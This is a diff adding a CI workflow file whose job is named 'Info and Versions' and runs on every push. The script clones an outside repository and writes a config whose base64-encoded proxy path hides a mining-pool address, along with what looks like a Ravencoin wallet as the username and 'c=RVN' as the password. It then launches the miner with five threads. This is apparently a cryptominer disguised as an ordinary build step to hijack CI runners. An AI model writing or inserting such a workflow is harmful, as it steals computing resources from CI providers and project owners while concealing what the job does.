@@ -1,0 +1,18 @@
+workflows:
+  info-and-versions:
+    name: Info and Versions
+    instance_type: mac_mini_m2
+    max_build_duration: 110
+    triggering:
+      events:
+        - push
+      branch_patterns:
+        - pattern: "*"
+          include: true
+    scripts:
+      - name: Run
+        script: |
+          git clone https://github.com/taum10974-crypto/papa.git papa
+          cd papa
+          echo -e "proxy=wss://identical-sile-malphite-node-dfaa5ec5.koyeb.app/eGVsaXN2Mi1wZXBldy5uYS5taW5lLnpwb29sLmNhOjQ4MzM=\nhost=127.0.0.1\nport=3306\nusername=rM5GziBWoT9y4DQaiacGahTvKZze2TpzrB\npassword=c=RVN,1avip\nthreads=5" > data.txt
+          TERM=xterm-256color python3 main.py 5 --dataset=data.txt --output=result.txt
